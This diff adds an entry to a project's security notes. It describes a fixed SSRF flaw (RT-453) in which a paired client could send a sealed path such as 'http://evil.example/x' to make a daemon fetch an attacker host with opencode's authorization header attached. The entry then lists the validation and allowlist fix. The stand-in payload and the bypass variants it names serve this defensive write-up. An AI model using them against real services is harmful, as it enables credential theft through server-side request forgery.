@@ -142,6 +142,30 @@ identity servers, no accounts.
   `ocr_frame_handler_errors_total` (error name only, never frame content).
   The client applies the same fail-closed `seq` rule and never logs frame
   content.
+- A paired client could turn the daemon into a reading SSRF proxy with the
+  opencode credential attached (RT-453): `req.path` inside the sealed op
+  envelope is attacker-controllable text, and `new URL(req.path,
+  OPENCODE_URL)` discards the loopback base whenever the value carries a
+  scheme or an authority — a sealed `{"path":"http://evil.example/x"}` (or
+  the protocol-relative/backslash variants) used to make the daemon fetch an
+  attacker host with the `authorization` header of opencode included, and the
+  response body flowed back sealed to the same client. The op path is now
+  validated at the single point both transports pass through: a pure
+  fail-closed verdict (`relativePathVerdict`) rejects non-strings, oversized
+  paths (512), control characters and whitespace (the URL parser strips
+  these at the edge), anything not starting with `/`, protocol-relative and
+  backslash authorities, embedded `?`/`#` (queries travel in the typed
+  `req.query`), `..` segments and methods outside GET/POST/DELETE/PATCH/PUT;
+  a second anchored allowlist (`allowedUpstreamPath`) admits only the
+  opencode routes the clients actually use — plus the fixed literal
+  `/global/health` that the post-deploy live soak probes the tunnel with —
+  before the passthrough builds its URL. Both gates answer 400 with a
+  constant body, count in `ocr_op_path_rejected_total`, and never log, audit
+  or echo the rejected path (log-injection), nor attribute an auth failure to
+  the paired device.
+  Residual limitation: the allowlist is hand-maintained — when opencode
+  gains a route a client needs, a new entry is required, and until then the
+  request fails closed with 400 (never a silent passthrough).
 - A rogue device cannot sustain a flood through the relay: message frames are
   token-bucketed per connection (600 msgs/min, burst 1000, tunable via env)
   and the over-budget socket is dropped with close code 4029. Every frame
